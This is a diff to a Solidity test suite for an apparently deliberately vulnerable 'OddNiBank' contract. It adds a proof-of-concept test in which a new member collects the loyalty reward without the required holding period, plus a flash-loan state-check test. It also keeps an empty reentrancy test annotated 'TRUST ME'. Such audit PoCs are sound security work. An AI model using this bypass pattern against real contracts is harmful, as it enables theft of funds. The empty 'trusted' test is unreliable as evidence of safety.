@@ -5,12 +5,13 @@ import "../src/OddNiBank.sol";
 import "../src/OddNiBenefit.sol";
 // import "../src/attek.sol";
 import {Test, console} from "forge-std/Test.sol";
+import {LoanBorrower} from "./LoanBorrower.sol";
 
-contract OddNiOverallTest is Test{
+contract OddNiOverallTest is Test {
     // account
-    address public deployer = makeAddr('deployer');
-    address public tester = makeAddr('tester');
-    address public victim = makeAddr('victim');
+    address public deployer = makeAddr("deployer");
+    address public tester = makeAddr("tester");
+    address public victim = makeAddr("victim");
 
     OddNiBank public OBA;
     OddNiBenefit public OBE;
@@ -20,7 +21,7 @@ contract OddNiOverallTest is Test{
     uint256 public constant MINIMUM_HOLD_DURATION = 30 days;
     uint256 public constant LOYALTY_REWARD = 0.1 ether;
 
-    function setUp() public{
+    function setUp() public {
         vm.startPrank(deployer);
         vm.deal(deployer, 1000 ether);
         OBA = new OddNiBank{value: 500 ether}();
@@ -28,15 +29,15 @@ contract OddNiOverallTest is Test{
         vm.stopPrank();
     }
 
-    function testForAccessWithoutMember() public{
+    function testForAccessWithoutMember() public {
         // Attempt to call claimRegistrationBonus as a non-member
-        vm.startPrank(tester); 
+        vm.startPrank(tester);
         vm.expectRevert(OddNiBank.NotMember.selector);
         OBA.claimRegistrationBonus(); // This call should fail and revert with NotMember
         vm.stopPrank();
 
         // Deposit
-        vm.startPrank(tester); 
+        vm.startPrank(tester);
         vm.deal(tester, 100 ether);
         vm.expectRevert(OddNiBank.NotMember.selector);
         OBA.depositAsset{value: 10 ether}(); // This call should fail and revert with NotMember
@@ -46,15 +47,15 @@ contract OddNiOverallTest is Test{
         // the functions above is able to be accessed.
     }
 
-    function testForMultipleRegistration() public{
-        vm.startPrank(tester); 
+    function testForMultipleRegistration() public {
+        vm.startPrank(tester);
         OBA.registerAsMember();
         vm.expectRevert(OddNiBank.AlreadyRegistered.selector);
         OBA.registerAsMember(); // This call should fail and revert with AlreadyRegistered
         vm.stopPrank();
     }
 
-    function testForDeposit() public{
+    function testForDeposit() public {
         vm.startPrank(tester);
         vm.deal(tester, 100 ether);
         OBA.registerAsMember();
@@ -62,12 +63,11 @@ contract OddNiOverallTest is Test{
         assertEq(OBA.getDepositedAmount(address(tester)), 50 ether);
     }
 
-    function testForCustomReentrancyLock() public{
+    function testForCustomReentrancyLock() public {
         // The internal Auditor has tested this function. TRUST ME.
-
     }
 
-    function testForAccidentalETHSend() public{
+    function testForAccidentalETHSend() public {
         // Triggering the receive() function
         vm.startPrank(tester);
         vm.deal(tester, 100 ether);
@@ -103,7 +103,11 @@ contract OddNiOverallTest is Test{
 
         // Verify the reward has been received
         uint256 finalBalance = tester.balance;
-        assertEq(finalBalance, initialBalance + LOYALTY_REWARD, "Loyalty reward not received");
+        assertEq(
+            finalBalance,
+            initialBalance + LOYALTY_REWARD,
+            "Loyalty reward not received"
+        );
 
         vm.stopPrank();
     }
@@ -131,4 +135,86 @@ contract OddNiOverallTest is Test{
         vm.stopPrank();
     }
 
+    function test_PoC_bypassHoldingTimestamps() public {
+        // first set the timestamp to current time. eg 4 jan 2025: 1735996788
+        vm.warp(1735996788);
+
+        vm.startPrank(tester);
+        vm.deal(tester, 10 ether);
+
+        OBA.registerAsMember();
+
+        OBA.depositAsset{value: MINIMUM_DEPOSIT}();
+
+        uint256 initialBalance = tester.balance;
+        OBE.rewardLoyalMembers();
+        uint256 finalBalance = tester.balance;
+
+        // check if the reward is received by checking if finalBalance is greater than initialBalance
+        assert(finalBalance > initialBalance);
+        vm.stopPrank();
+    }
+
+    function testFlashloanByContractStateChangers() public {
+        LoanBorrower loanBorrower = new LoanBorrower(payable(address(OBA)));
+        vm.deal(address(loanBorrower), 10 ether);
+        vm.prank(address(loanBorrower));
+        OBA.registerAsMember();
+
+        vm.prank(address(loanBorrower));
+        OBA.depositAsset{value: 2 ether}();
+
+        uint256 borrowerBalanceBefore = address(loanBorrower).balance;
+
+        uint256 loanAmount = 1 ether;
+        uint256 balanceBefore = address(OBA).balance;
+
+        loanBorrower.executeFlashloan(loanAmount);
+        uint256 balanceAfter = address(OBA).balance;
+        assertEq(
+            balanceBefore,
+            balanceAfter,
+            "Contract balance did not return to the original amount!"
+        );
+
+        bool lockState = OBA.reentrancyLock();
+        assertEq(
+            lockState,
+            false,
+            "Reentrancy lock Should be false after flashloan"
+        );
+
+        uint256 contractBankBalanceAfter = address(OBA).balance;
+        assertEq(
+            balanceBefore,
+            contractBankBalanceAfter,
+            "Contract Balance should match"
+        );
+
+        // make sure member balance not change
+        uint256 memberBalanceAfter = address(loanBorrower).balance;
+        assertEq(
+            borrowerBalanceBefore,
+            memberBalanceAfter,
+            "Member balance should not change"
+        );
+
+        uint256 contractassetInvestedAfter = OBA.getDepositedAmount(
+            address(loanBorrower)
+        );
+        assertEq(
+            contractassetInvestedAfter,
+            2 ether,
+            "Asset Invested Should Remain Unchanged"
+        );
+
+        bool contractBonusStatus = OBA.bonusTaken(address(loanBorrower));
+        assertEq(contractBonusStatus, false, "Bonus Should Remain Unchanged");
+        bool ContractmemberStatus = OBA.getMemberStatus(address(loanBorrower));
+        assertEq(
+            ContractmemberStatus,
+            true,
+            "Member Status Should Remain unchanged"
+        );
+    }
 }
